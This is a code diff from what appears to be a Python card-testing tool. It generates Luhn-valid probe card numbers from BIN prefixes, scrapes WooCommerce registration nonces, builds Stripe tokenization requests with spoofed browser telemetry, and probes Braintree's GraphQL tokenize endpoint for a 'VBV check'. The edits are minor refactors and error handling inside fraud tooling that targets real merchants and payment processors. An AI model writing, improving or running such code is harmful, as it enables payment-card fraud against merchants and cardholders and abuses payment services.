@@ -11,8 +11,10 @@ import string
 import uuid
 from datetime import datetime, timezone
 
-STRIPE_API_VERSION = "2024-06-20"
-STRIPE_JS_BUILD = "c1fbe29896"
+import config as _cfg
+
+STRIPE_API_VERSION = _cfg.STRIPE_API_VERSION
+STRIPE_JS_BUILD = _cfg.STRIPE_JS_BUILD
 
 # --- Regex'ы: единственный источник ---
 RE_REG_NONCE = re.compile(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']')
@@ -146,10 +148,14 @@ def gen_probe_card(bin_prefix: str | None = None) -> dict:
     prefix = bin_prefix if bin_prefix else random.choice(_PROBE_BINS)
     body = "".join(random.choices(string.digits, k=15 - len(prefix)))
     partial = prefix + body
+    mm = f"{random.randint(1, 12):02d}"
+    yy = str(random.randint(1, 4) + 2026)
     return {
         "number": partial + str(luhn_check_digit(partial)),
-        "mm": f"{random.randint(1, 12):02d}",
-        "yy": str(random.randint(1, 4) + 2026),
+        "mm": mm,
+        "month": mm,
+        "yy": yy,
+        "year": yy,
         "cvc": f"{random.randint(0, 999):03d}",
     }
 
@@ -674,8 +680,8 @@ def tokenize_body(card: dict, telem: dict, referrer: str) -> dict:
         "billing_details[address][country]": telem["country"],
         "card[number]": card["number"],
         "card[cvc]": card["cvc"],
-        "card[exp_month]": card["month"],
-        "card[exp_year]": card["year"],
+        "card[exp_month]": str(card.get("month") or card.get("mm")),
+        "card[exp_year]": str(card.get("year") or card.get("yy")),
         "allow_redisplay": "unspecified",
         "guid": telem["guid"],
         "muid": telem["muid"],
@@ -972,10 +978,13 @@ async def braintree_vbv_check(s, html: str, card_raw: str,
                 "options": {"validate": False}}},
             "operationName": "Tokenize",
         }
-        r = await s.post("https://payments.braintree-api.com/graphql",
-                         json={**tkq, "metaData": {"tokenizationKey": keys["tokenization_key"]}},
-                         headers={"Origin": "https://assets.braintreegateway.com",
-                                  "Content-Type": "application/json"}, timeout=12)
+        try:
+            r = await s.post("https://payments.braintree-api.com/graphql",
+                             json={**tkq, "metaData": {"tokenizationKey": keys["tokenization_key"]}},
+                             headers={"Origin": "https://assets.braintreegateway.com",
+                                      "Content-Type": "application/json"}, timeout=12)
+        except Exception as e:
+            return {"status": "ERROR", "detail": f"gql post: {type(e).__name__}: {e}"[:150]}
         try:
             d = r.json()
             pm = ((d.get("data") or {}).get("tokenizeCreditCard") or {}).get("paymentMethod") or {}
